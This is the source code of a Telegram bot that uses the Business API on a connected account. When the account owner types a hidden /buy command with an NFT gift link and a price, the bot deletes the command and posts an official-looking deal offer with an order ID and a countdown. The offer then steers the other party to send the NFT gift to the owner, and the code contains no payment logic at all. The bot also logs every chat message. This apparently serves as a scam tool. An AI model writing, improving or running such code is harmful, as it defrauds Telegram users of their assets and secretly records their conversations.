import asyncio
import datetime
import json
import os
import random
import re
import string

from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BusinessConnection,
)

from config import BOT_TOKEN, BOT_USERNAME
from texts import TEXTS, currency_html

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

CONN_FILE = "connections.json"
DEALS_FILE = "pending_deals.json"
LOG_FILE = "messages.log"

DEAL_LIFETIME_HOURS = 12
UPDATE_INTERVAL = 60  # секунд


def load_json(path: str) -> dict:
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"[LOAD ERROR] {path}: {e}")
    return {}


def save_json(path: str, data: dict):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[SAVE ERROR] {path}: {e}")


def log_message(chat_id: int, username: str | None, text: str):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    username_str = f"@{username}" if username else "—"
    line = f"[{timestamp}] chat_id={chat_id} user={username_str} text={text!r}\n"
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception as e:
        print(f"[LOG ERROR] {e}")


def human_left(seconds: int) -> str:
    """Преобразует секунды в 'X ч Y мин' / 'X h Y min'."""
    if seconds <= 0:
        return "0 мин"
    h = seconds // 3600
    m = (seconds % 3600) // 60
    if h > 0:
        return f"{h} ч {m} мин"
    return f"{m} мин"


# ---------- Хранилища ----------

pending_deals: dict[int, dict] = {
    int(k): v for k, v in load_json(DEALS_FILE).items()
}

business_connections: dict[int, str] = {
    int(k): v for k, v in load_json(CONN_FILE).items()
}

known_users: dict[str, int] = {}


def save_deals():
    save_json(DEALS_FILE, {str(k): v for k, v in pending_deals.items()})


def save_connections():
    save_json(CONN_FILE, {str(k): v for k, v in business_connections.items()})


# ---------- Premium-эмодзи для кнопок ----------
EMOJI_ACCEPT = "5774022692642492953"
EMOJI_DECLINE = "5774077015388852135"
EMOJI_GIFT = "5774022692642492953"      # замени
EMOJI_CONFIRM = "5774022692642492953"   # замени


# ---------- Кнопки ----------

def offer_kb(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text=t["btn_accept"],
            callback_data="deal:accept",
            icon_custom_emoji_id=EMOJI_ACCEPT,
        ),
        InlineKeyboardButton(
            text=t["btn_decline"],
            callback_data="deal:decline",
            icon_custom_emoji_id=EMOJI_DECLINE,
        ),
    ]])


def deal_kb(lang: str, target_username: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    gift_url = f"tg://send_gift?to={target_username}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=t["btn_give"],
            url=gift_url,
            icon_custom_emoji_id=EMOJI_GIFT,
        )],
        [InlineKeyboardButton(
            text=t["btn_confirm"],
            callback_data="deal:confirm",
            icon_custom_emoji_id=EMOJI_CONFIRM,
        )],
    ])


# ---------- Утилиты ----------

def parse_gift_name(link: str) -> str:
    slug = link.rstrip("/").split("/")[-1]
    if "-" in slug:
        name, num = slug.rsplit("-", 1)
        name = re.sub(r"(?<!^)(?=[A-Z])", " ", name)
        title = f"{name} #{num}"
    else:
        title = slug
    return f'<a href="{link}">{title}</a>'


def gen_order_id() -> str:
    chars = string.ascii_uppercase + string.digits
    return "".join(random.choices(chars, k=10))


def detect_lang(code: str | None) -> str:
    if code and code.lower() in ("ru", "en", "cn", "ar"):
        return code.lower()
    return "ru"


def detect_currency(code: str | None) -> str:
    if code and code.upper() == "GRAM":
        return "GRAM"
    return "STARS"


# ---------- Бизнес-подключение ----------

@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    if connection.is_enabled:
        business_connections[connection.user.id] = connection.id
        save_connections()
        print(f"[BUSINESS] ✅ Подключён: user_id={connection.user.id}")
        print(f"[BUSINESS] connection_id={connection.id}")
    else:
        business_connections.pop(connection.user.id, None)
        save_connections()
        print(f"[BUSINESS] ❌ Отключён: user_id={connection.user.id}")


# ---------- Регулярка /buy ----------

BUY_RE = re.compile(
    r"/buy\s+"
    r"(?P<link>\S+)\s+"
    r"(?P<amount>\d+)"
    r"(?:\s+(?P<opt1>STARS|GRAM|ru|en|cn|ar))?"
    r"(?:\s+(?P<opt2>STARS|GRAM|ru|en|cn|ar))?"
    r"\s*$",
    re.IGNORECASE,
)


# ---------- Живой таймер ----------

async def live_timer(chat_id: int, message_id: int, expire_ts: float):
    """
    Каждые 60 секунд обновляет сообщение, пока сделка активна.
    """
    while True:
        await asyncio.sleep(UPDATE_INTERVAL)

        deal = pending_deals.get(chat_id)
        if not deal:
            print(f"[TIMER] Сделка {chat_id} больше не активна, останавливаю таймер")
            return

        seconds_left = int(expire_ts - datetime.datetime.now().timestamp())
        if seconds_left <= 0:
            # Сделка истекла
            lang = deal.get("lang", "ru")
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=TEXTS[lang]["expired"],
                    business_connection_id=deal.get("connection_id"),
                )
                print(f"[TIMER] Сделка {chat_id} истекла")
            except Exception as e:
                print(f"[TIMER EDIT ERROR] {e}")
            pending_deals.pop(chat_id, None)
            save_deals()
            return

        lang = deal.get("lang", "ru")
        t = TEXTS[lang]
        time_left = human_left(seconds_left)

        new_text = t["offer"].format(
            amount=deal["amount"],
            currency=deal["currency_display"],
            gift_name=deal["gift_name"],
            time_left=time_left,
        )

        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=new_text,
                reply_markup=offer_kb(lang),
                business_connection_id=deal.get("connection_id"),
            )
            print(f"[TIMER] Обновлено {chat_id}: {time_left}")
        except Exception as e:
            print(f"[TIMER EDIT ERROR] {e}")


# ---------- Ловим сообщения в бизнес-чатах ----------

@dp.business_message()
async def on_business_message(message: types.Message):
    chat_id = message.chat.id
    user_id = message.from_user.id if message.from_user else None
    username = message.from_user.username if message.from_user else None
    text = message.text or ""

    log_message(chat_id, username, text)
    print(f"[BUSINESS MSG] chat_id={chat_id}, user_id={user_id}, @{username}: {text!r}")

    if not text:
        return

    m = BUY_RE.match(text)
    if not m:
        return

    print(f"[BUY MATCH] {m.groupdict()}")

    connection_id = business_connections.get(user_id)
    if not connection_id:
        print(f"[WARN] Нет connection_id для user_id={user_id}")
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=connection_id,
            message_ids=[message.message_id],
        )
        print(f"[DELETE] ✅ Удалено сообщение {message.message_id}")
    except Exception as e:
        print(f"[DELETE ERROR] {e}")

    link = m.group("link")
    amount = int(m.group("amount"))

    opts = [m.group("opt1"), m.group("opt2")]
    lang_code = None
    currency_code = None
    for o in opts:
        if not o:
            continue
        if o.lower() in ("ru", "en", "cn", "ar"):
            lang_code = o.lower()
        elif o.upper() in ("STARS", "GRAM"):
            currency_code = o.upper()

    lang = detect_lang(lang_code)
    currency = detect_currency(currency_code)
    currency_disp = currency_html(currency)

    gift_name = parse_gift_name(link)
    order_id = gen_order_id()

    # Время окончания — 12 часов от текущего момента
    now = datetime.datetime.now()
    expire_dt = now + datetime.timedelta(hours=DEAL_LIFETIME_HOURS)
    expire_ts = expire_dt.timestamp()
    time_left = human_left(DEAL_LIFETIME_HOURS * 3600)

    seller_username = username or ""

    pending_deals[chat_id] = {
        "amount": amount,
        "currency": currency,
        "currency_display": currency_disp,
        "gift_name": gift_name,
        "buyer_username": username or "",
        "target_username": seller_username,
        "order_id": order_id,
        "connection_id": connection_id,
        "lang": lang,
        "expire_ts": expire_ts,
    }
    save_deals()

    t = TEXTS[lang]

    try:
        sent = await bot.send_message(
            chat_id=chat_id,
            text=t["offer"].format(
                amount=amount,
                currency=currency_disp,
                gift_name=gift_name,
                time_left=time_left,
            ),
            reply_markup=offer_kb(lang),
            business_connection_id=connection_id,
        )
        print(f"[BUSINESS SEND] ✅ Отправлено в чат {chat_id}, msg_id={sent.message_id}")

        # ⚠️ Запускаем живой таймер
        asyncio.create_task(live_timer(chat_id, sent.message_id, expire_ts))
        print(f"[TIMER] ✅ Таймер запущен для {chat_id}")
    except Exception as e:
        print(f"[ERROR] {e}")


# ---------- /start ----------

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    u = message.from_user
    if u.username:
        known_users[u.username.lower()] = u.id

    await message.answer(
        "Привет! Я демо-бот.\n\n"
        f"Формат команды:\n"
        f"<code>/buy &lt;ссылка&gt; &lt;цена&gt; [STARS|GRAM] [ru|en|cn|ar]</code>\n\n"
        f"Примеры:\n"
        f"<code>/buy t.me/nft/SpicedWine-32395 2000 STARS ru</code>\n"
        f"<code>/buy t.me/nft/SpicedWine-32395 444 GRAM en</code>\n"
        f"<code>/buy t.me/nft/SpicedWine-32395 1000 STARS cn</code>\n"
        f"<code>/buy t.me/nft/SpicedWine-32395 500 STARS ar</code>"
    )


# ---------- Callback: Принять ----------

@dp.callback_query(F.data == "deal:accept")
async def on_accept(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    print(f"[CALLBACK] accept от chat_id={chat_id}")

    deal = pending_deals.get(chat_id)
    if not deal:
        print(f"[ERROR] Сделка не найдена для chat_id={chat_id}")
        await call.answer("Сделка не найдена", show_alert=True)
        try:
            await call.message.edit_reply_markup(reply_markup=None)
        except Exception:
            pass
        return

    lang = deal.get("lang", "ru")
    currency = deal.get("currency_display", "⭐ Stars")
    t = TEXTS[lang]

    target_username = deal.get("target_username", "")

    # считаем оставшееся время для второго сообщения
    seconds_left = int(deal.get("expire_ts", 0) - datetime.datetime.now().timestamp())
    time_left = human_left(seconds_left)

    try:
        await call.message.edit_reply_markup(reply_markup=None)
    except Exception as e:
        print(f"[EDIT ERROR] {e}")

    try:
        await call.message.answer(
            t["deal"].format(
                order_id=deal["order_id"],
                amount=deal["amount"],
                currency=currency,
                buyer_username=deal["buyer_username"],
                gift_name=deal["gift_name"],
                gift_username=target_username,
                time_left=time_left,
            ),
            reply_markup=deal_kb(lang, target_username),
        )
    except Exception as e:
        print(f"[SEND ERROR] {e}")

    await call.answer()


# ---------- Callback: Отклонить ----------

@dp.callback_query(F.data == "deal:decline")
async def on_decline(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    print(f"[CALLBACK] decline от chat_id={chat_id}")

    deal = pending_deals.pop(chat_id, None)
    save_deals()
    lang = deal.get("lang", "ru") if deal else "ru"

    try:
        await call.message.delete()
        print(f"[DECLINE] ✅ Сообщение удалено")
    except Exception as e:
        print(f"[DELETE MSG ERROR] {e}")
        try:
            await call.message.edit_reply_markup(reply_markup=None)
        except Exception as e2:
            print(f"[EDIT ERROR] {e2}")

    await call.answer(TEXTS[lang]["declined"])


# ---------- Callback: Подтвердить передачу ----------

@dp.callback_query(F.data == "deal:confirm")
async def on_confirm(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    print(f"[CALLBACK] confirm от chat_id={chat_id}")

    deal = pending_deals.pop(chat_id, None)
    save_deals()
    lang = deal.get("lang", "ru") if deal else "ru"

    try:
        await call.message.edit_reply_markup(reply_markup=None)
    except Exception as e:
        print(f"[EDIT ERROR] {e}")

    try:
        await call.message.answer(TEXTS[lang]["confirm_msg"])
    except Exception as e:
        print(f"[SEND ERROR] {e}")

    await call.answer()


# ---------- Запуск ----------

async def main():
    print(f"Бот запущен. BOT_USERNAME=@{BOT_USERNAME}")
    print(f"[START] DEAL_LIFETIME_HOURS={DEAL_LIFETIME_HOURS}")
    print(f"[START] UPDATE_INTERVAL={UPDATE_INTERVAL}s")
    print(f"[START] business_connections={business_connections}")
    print(f"[START] pending_deals keys={list(pending_deals.keys())}")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
